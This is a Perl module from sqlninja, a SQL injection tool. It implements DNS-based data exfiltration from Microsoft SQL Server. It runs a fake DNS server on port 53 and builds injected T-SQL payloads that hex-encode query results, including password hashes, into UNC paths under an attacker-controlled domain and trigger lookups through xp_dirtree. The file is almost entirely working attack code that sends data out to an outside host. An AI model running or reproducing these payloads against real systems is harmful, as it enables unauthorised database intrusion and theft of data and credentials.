# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.


# DNS packet structure:
# [type][last_flag][counter1].d[data].t[reqtracker].[domain]
#
# type: s = string
#       n = number
#
# last_flag: l = last
#   	     n = not last
#
# [data] in last string packet is just "x"
#
# This encoding will make requests valid not only for RFC1123 but also 
# for RFC952. 
# You know, in case you deal with DNS servers from the eighties :)

use strict;
our $conf;

my $dnssock; # UNIX socket used to transmit DNS names to the decoder process
my $dnscommssock; # UNIX socket to transmit decoded data and control messages to dnsmaster()

my $dnsdatadecoderpid; # PID of the decoder
my $dnsdataserverpid; # PID of the DNS server

my $reqtracker = 0; # Query counter. It is used to detect DNS packets belonging to old queries

#use sigtrap 'handler' => \&shutdown_module, 'HUP', 'INT', 'ABRT', 'QUIT', 'TERM', 'stack-trace', 'error-signals';


# Start fake DNS server and decoder processes
# Public: called from getdata.pl
sub setup_module() {
	# start DNS Server
	$dnssock = genfile("dnssock");
	unlink $dnssock;
	$dnscommssock = genfile("dnsninja");
	unlink $dnscommssock;

	print_verbose "Starting dns server process\n";

	$dnsdataserverpid = fork(); # PID of the DNS Server 
	if ($dnsdataserverpid == -1) {
		print "can't fork dns server process\n";
		exit(1);
	}
	if ($dnsdataserverpid == 0) {
		dnsdataserver(); # Start the actual server
		exit(0);
	}

	# spawn decoder process
	print_verbose "Starting decoder process\n";

	$dnsdatadecoderpid = fork();
	if ($dnsdatadecoderpid == -1) {
		print "can't fork decoder process\n";
		exit(1);
	}
	if ($dnsdatadecoderpid == 0) {
		dns_data_decode();
		exit(0);
	}
	return;
}

# When exiting DNS data extraction mode, kill the child processes
# Public: called from getdata.pl
sub shutdown_module()
{
	print "[+] killing child processes $dnsdataserverpid and $dnsdatadecoderpid\n";
  	kill (9,$dnsdataserverpid);
	kill (9,$dnsdatadecoderpid);
}

# Public: called from get_data(), calls dnsdatamaster() and then waits for the result
sub extract_number
{

	my $inner_query = $_[0]; # The query to execute
	my $min = $_[1]; # Minimum number to try. Unused here
	my $max = $_[2]; # Maximum number to try UNused here
	my $showoutput = $_[3]; # 0: Don't show output. 1: show output 2: show more output
	my $desc = $_[4]; # Just a description
	my $result = dnsdatamaster("number",$inner_query);
	# write shit, if $showoutput
	return $result;
}

sub sanity_check
{
	# Don't do anything. This is only for time based extraction
	return 1;

}
# Public: called from get_data(), calls dnsdatamaster() and then waits for the result
sub extract_string

{
	my $inner_query_string = $_[0]; # The query to execute to extract the string
	my $inner_query_len = $_[1]; # The query to execute to extract its length (if needed)
	my $minlen = $_[2]; # Minimum length, usually 0. Unused here
 	my $maxlen = $_[3]; # Max length. Unused here
	my $output = $_[4]; # Boolean: whether to output stuff during extraction
	my $description = $_[5]; # Description of the string (only if $output == 1)
	my $result = dnsdatamaster("string",$inner_query_string,$inner_query_len);

	if ($output > 0) {
		print $description.": ".$result."\n";
	}
	return $result;
}

sub extract_hash
{
	my ($query, $len) = @_;
	my $hash = extract_string("SELECT COALESCE(($query),'-')", "SELECT COALESCE(LEN(($query)), 1)", 0, $len, 0, "hash");
	if ($hash eq "-") {
		return "";
	}
	
	return $hash;
}

# TODO: do this one!
sub extract_datatype
{
	my $column = $_[0];	
	my $table = $_[1];
	my $database = $_[2];
	my $query;
	my $query_len;

	if ($database ne "") {
		$database .= "..";
	}

	$query = "select type_name(".$database."syscolumns.xtype) ".
		 "from ".$database."syscolumns, ".$database."sysobjects ".
		 "WHERE ".$database."syscolumns.id=".$database."sysobjects.id ".
		 "AND ".$database."sysobjects.name='".$table."' ".
		 "and ".$database."syscolumns.name = '".$column."'";

	$query_len = "select len(type_name(".$database."syscolumns.xtype)) ".
		 "from ".$database."syscolumns, ".$database."sysobjects ".
		 "WHERE ".$database."syscolumns.id=".$database."sysobjects.id ".
		 "AND ".$database."sysobjects.name='".$table."' ".
		 "and ".$database."syscolumns.name = '".$column."'";

        my $result = dnsdatamaster("string",$query,$query_len);

	return $result;

}


# Main function here. It receives the query to execute from extract_string or extract_number
# Then it starts dnsninjasock, finally calls the appropriate function to perform the actual request
# It then waits for the results. When it receives the result from the decoder, it passes it to the caller
sub dnsdatamaster
{
	my $type = $_[0];
	my $query = $_[1];
	my $query_len = $_[2];
	my $msg; # message received via dnsninjasock
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting local UNIX socket\n";
	}
	unlink $dnscommssock;
	# This socket is used to receive communications from the web request
	# child and the timeout child
	my $server = new IO::Socket::UNIX->new(Local => $dnscommssock,
					       Type  => SOCK_DGRAM,
					       Listen=> 20)
				|| die "can't create UNIX socket: $!\n";
	# communicate current value of counter to dns decoder 
	my $s = IO::Socket::UNIX->new(Peer => $dnssock,
					      Type => SOCK_DGRAM,
					      Timeout => 5) || die "can't create UNIX socket to $dnssock: $!\n" ;

	$s->send("----$reqtracker----");
	close $s;

	# spawn the process for the web request
	print_verbose "Starting web request process\n";

	my $requestpid = fork();
	if ($requestpid == -1) {
		print "can't fork web request process\n";
		close $server;
		unlink $dnscommssock;
		unlink $dnssock;
		exit(1);
	}
	if ($requestpid == 0) {
		$server->close;
		if ($type eq "string") {
			extract_string_priv($query,$query_len);
		} else {
			extract_number_priv($query);
		}
		$s = IO::Socket::UNIX->new(Peer => $dnscommssock,
					      Type => SOCK_DGRAM,
					      Timeout => 5);
		sleep(10); # Timeout to give the server time to respond
		$s->send("webdone");
		close $s;
		exit(0);
	}
	# Now wait for news....
	$server->recv($msg,65535,0); # might want to increase this!
	# case 1: the web request has finished, 10 seconds have passed, and
	# no 'decoded' yet. Something is wrong.
	if ($msg =~ /^webdone/) {
		print "[-] DNS replies have been lost... sorry\n";
		# shutdown_module();
		return "";
	} elsif ($msg =~ /^decoded/) {
		$msg =~ s/^decoded://;
		kill TERM => $requestpid;
		close $server;
	#	print "unlinking $dnscommssock\n";
		unlink $dnscommssock;
		$reqtracker++;
		$reqtracker = $reqtracker % $conf->{'dnscountermodulo'};
		return $msg;
	}
}


sub extract_number_priv
{
	my $query_len = $_[0];
	my $cmd = "declare \@a varchar(999),".
		 "\@i varchar(99);".
		 "set \@i=cast((".$query_len.") as varchar(99));".
		 "set \@a='\\\\nl0.d'+\@i+'.t".$reqtracker.".".$conf->{'domain'}."\\a';".
		 "exec master..xp_dirtree \@a;";
	my $command = createcommand($cmd);
	my $result = sendrequest($cmd);
}

# Extract a string from the DB
sub extract_string_priv
{
	my $query = $_[0];
	my $query_len = $_[1];
	my $cmd = "declare \@c varchar(999),\@a varchar(999),".
		  "\@i int,\@j int;".
		  "set \@j=0;".
		  "set \@i=(".$query_len.");".
		  "while \@j*".$conf->{'dnschars'}."<\@i begin ".
		    "set \@a=substring((".$query."),\@j*".$conf->{'dnschars'}."+1,".$conf->{'dnschars'}.");".
		    "set \@c=master.dbo.fn_varbintohexstr(cast(\@a as varbinary(999)));".
		    "set \@a='\\\\sn'+cast(\@j as varchar(99))+'.d'+\@c+'.t".$reqtracker.".".$conf->{'domain'}."\\a';".
		    "exec master..xp_dirtree \@a;".
		    "set \@j=\@j+1;".
		  "end;".
		  "set \@a='\\\\sl'+cast(\@j as varchar(99))+'.dx.t".$reqtracker.".".$conf->{'domain'}."\\a';".
		  "exec master..xp_dirtree \@a";
	my $command = createcommand($cmd);
	my $result = sendrequest($cmd);
}

# Sniff dns requests and processes them
sub dnsdataserver
{
	my $ns = Net::DNS::Nameserver->new(
			LocalAddr	=> "0.0.0.0",
			LocalPort    => 53,
			ReplyHandler => \&dns_data_reply_handler,
			Verbose      => 0
		) || die "could't create nameserver object\n";
	$ns->main_loop;	
}

sub dns_data_reply_handler
{ 
	my ($qname, $qclass, $qtype, $peerhost) = @_;
	my ($rcode, @ans, @auth, @add);
	if (($qtype ne "A") or ($qname !~ /$conf->{'domain'}/)) { # Non-interesting data
		return;
	}
	my ($ttl,$rdata) = (0,$conf->{'resolvedip'});
	push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
	$rcode = "NOERROR";
	# print "Received DNS packet: $qname\n";
	if ($qname =~ m/$conf->{'domain'}$/) {
		my $s = IO::Socket::UNIX->new(Peer => $dnssock,
				      Type => SOCK_DGRAM,
				      Timeout => 10) || die "ouch! $!\n";
		# print "dispatching DNS data $qname to $dnssock \n";
		$s->send($qname);
		close $s;
	}
	return ($rcode, \@ans, \@auth, \@add, {aa => 1});
}

# Receive DNS queries, check syntax, decode them
sub dns_data_decode
{
	# Variables to store all various message fields
	my $type; # Type of data received
	my $last; # Last packet flag
	my $number; # number of current message
	my $msg;  # message from the DNS daemon
	my $recvtracker; # tracker number in the packet
	my $checktracker; # local copy of reqtracker

	my $tmpmsg; # Store received data while checks are performed

	# Variables to store message buffer data and controls
	my @msgarray; # holds all received messages
	my $buffer; # buffer to decode
	my $decoded; # decoded chunk
	my $complete = 0;     # boolean: all packets received ?
	my $lastbuffered = -1; # last message appended to buffer
	my $lastreceived = 0; # boolean: last packet received ?	
	my $chunk; # chunk to decode
		
	my $server = IO::Socket::UNIX->new(Local => $dnssock,
					   Type  => SOCK_DGRAM,
					   Listen=> 20)
			|| die "can't create UNIX socket: $!\n";
	# Let's start listening ! :)
	while (1) {
# 		# Flush all data from previous request
		@msgarray = ();
		$buffer = "";
		$decoded = "";
		$complete = 0;
		$lastreceived = 0;
		$lastbuffered = -1;
		# Now process new request
		while ($complete == 0) {
			$server->recv($msg,255,0);
			# print "Decoder has received $msg\n";
			if ($msg =~ m/----(\d+)----/) { # Connection counter from dnsmaster()
				$checktracker = $1;
				# Flush stuff
				# This *actually* needs to be BOTH HERE AND ABOVE!
				# If it was only above, this process might get stuck waiting for lost packets,
				# And the new tracker would start a new session with old data still in the buffer
				# If it was only here, last repeated DNS requests might trigger comms to a
				# $dnscommssock that is not there anymore
				# In other words, flushing needs to be done in response to 2 different scenarios
				# that only partially overlap
				@msgarray = ();
				$buffer = "";
				$decoded = "";
				$complete = 0;
				$lastreceived = 0;
				$lastbuffered = -1;
	#			print "Expected counter: $ctr\n";
				next;
			}
			# Check that the message is correctly formed
			unless ($msg =~ s/^([sn])([ln])(\d+)\.d(\w+)\.t(\d+)\.$conf->{'domain'}$//) {
				next;
			}
			($type, $last, $number, $tmpmsg, $recvtracker) = ($1, $2, $3, $4, $5);
			# More sanity checks 
			if ($recvtracker != $checktracker) {
	#			print "wrong counter: received ".$1.", expected $reqtracker\n";
				next;
			}
			if (($type eq "n") and ($number !~ m/\d+/)) {
				next; # If number, data must be only numbers
			}
			if (($type eq "s") and ($last eq "n") and ($tmpmsg !~ m/^0x[abcdef0123456789]+$/)) {
				next; # If string and not last, must be 0xHEX
			}
			if (($type eq "s") and ($last eq "l") and ($tmpmsg !~ m/^x$/)) {
				next; # If string and last, must be just "x"
			}
			# If we are here, the packet has passed all sanity checks
			if ($last eq "l") {
				$lastreceived = 1;
			}

			$msgarray[$number] = $tmpmsg; # We might be rewriting the same stuff. But it's 
						       # better than the risk of using data from prev conns
	
			# If the received message is exactly the same
			# that we were waiting for, append it to the buffer,
			# followed by other ones previously received in wrong 
			# order, if any
			my $arraylen = @msgarray;
			while (($msgarray[$number] ne "") and ($number<$arraylen)) {
				if ($number == ($lastbuffered+1)) {
					$buffer .= $msgarray[$number];
					$lastbuffered = $lastbuffered+1;
				}
				$number++;
			}
		
			# decode the buffer and print
			if ($type eq "s") {
				$decoded .= dns_data_hex_decode($buffer);
			} else {
				$decoded .= $buffer; # Numbers are not encoded :)
			}
			$buffer = "";
		
			# Are we at the end ?
			if ($lastreceived == 1) {
				$complete=check_dns_data_complete(\@msgarray);
			}
			# print "complete: ".$complete."\n";
		}
		# Send the decoded message to dnsmaster()
		if ((-S $dnscommssock) and (length($decoded) != 0)) {
			my $s = IO::Socket::UNIX->new(Peer => $dnscommssock,
				      Type => SOCK_DGRAM,
				      Timeout => 10)
				  ||  die "can't create UNIX socket to $dnscommssock: $!\n";
			# print "sending: ".$decoded."\n";
		       # print "sending decoded: $decoded\n";
		      $s->send("decoded:".$decoded);
		      close $s;
		}
	}
}

# Check whether all messages have been received
sub check_dns_data_complete
{
	my @msgarray=@{$_[0]};
#	if ($_[1] == 0) {
#		return 0;
#	}
	my $number = @msgarray;
	my $i;
	my $complete = 1;
#	if ($_[1] == 1) {
		for ($i=0;$i<$number;$i++) {
			if ($msgarray[$i] eq '') {
				$complete=0;
			}
		}
#	}
	return $complete;
}

sub dns_data_hex_decode {
	my $buffer = $_[0];
	$buffer = substr($buffer,2);
	my @array = ( $buffer =~ m/../g );
	return join '', map { chr( hex ) } @array;
}

sub refresh_data {
	my $updated = shift;

	if ($conf->{'refresh_session'}) {
		print "    (last updated: $updated)\n";
		my $answer = read_from_prompt("    Do you want to update this information? (y|n)", '[yn]');
		if ($answer eq 'y') {
			return 1;
		}
	}

	return 0;
}

1;